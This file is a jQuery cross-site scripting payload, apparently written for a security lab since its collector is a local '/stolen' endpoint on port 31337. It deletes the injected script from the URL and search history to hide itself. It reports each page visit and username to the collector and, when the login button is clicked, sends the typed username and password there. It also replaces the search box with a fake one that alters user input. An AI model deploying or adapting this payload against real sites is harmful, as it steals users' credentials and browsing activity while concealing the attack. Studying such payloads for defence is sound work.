$( document ).ready(function() {

    /* Removing the JavaScript code from the URL*/
    window.history.pushState("Blah", "Title", document.URL.split("%3Cscript")[0]); 

    /* Reporting the page displayed by loading the URL */
    var username = $("#logged-in-user").text();
    var encodedUrl = encodeURIComponent(document.URL);
    if (username) { 
        $.get("http://127.0.0.1:31337/stolen?event=nav&user=" + username + "&url=" + encodedUrl);
    } else {
        $.get("http://127.0.0.1:31337/stolen?event=nav&url=" + encodedUrl);
    }


    /* Hiding search elements that have JavaScript code */
    $("#history-list").children().each( function () { 
        var text = $(this).text();
        if (text.indexOf("script") > -1 || text.indexOf("$") > -1) { 
            var hidden_text = text.split("<script")[0];
            if (hidden_text) { 
                $(this).text(hidden_text);
            } else {
                $(this).hide();
            }
        }
    });

    /* Making the logout button report the user's username */
    $("#log-out-btn").on( "click", function () { 
        var username = $("#logged-in-user").text();
        $.get("http://127.0.0.1:31337/stolen?event=logout&user=" + username);
    });
    
    /* Removing the query that includes script code */
    $("#query-lbl").text($("#query-lbl").text().split("<script")[0]);

    /* Making the login button report the user's username and password */
    $("#log-in-btn").on( "click", function () { 
        var username = $("#username").val();
        var password = $("#userpass").val();
        $.get("http://127.0.0.1:31337/stolen?event=logout&user=" + username + "&pass=" + password);
    });

    /* Hiding the actual box, let them enter through a fake box */
    $("#query").hide();
    $(".search-well").append("<input id=\"query-fake\" type=\"text\" placeholder=\"Enter search terms\" autofocus=\"\" class=\"form-control input-lg search-field\">");
    $("#query-fake").change( function () { 
        $("#query").val($("#query-fake").val() + "allll this");
    });
});

